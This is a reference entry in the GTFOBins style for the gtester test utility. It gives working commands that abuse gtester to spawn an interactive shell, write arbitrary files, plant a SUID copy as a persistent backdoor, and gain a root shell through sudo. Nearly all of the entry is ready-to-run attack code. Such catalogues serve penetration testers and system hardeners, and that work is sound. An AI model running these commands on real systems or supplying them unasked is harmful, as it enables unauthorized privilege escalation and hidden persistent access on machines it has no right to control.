# GTFOBin: gtester

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
TF=$(mktemp)
echo '#!/bin/sh' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
gtester -q $TF
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

Data to be written appears in an XML attribute in the output file (`<testbinary path="DATA">`).

```
LFILE=file_to_write
gtester "DATA" -o $LFILE
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which gtester) .

TF=$(mktemp)
echo '#!/bin/sh -p' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
TF=$(mktemp)
echo '#!/bin/sh' > $TF
echo 'exec /bin/sh 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF
```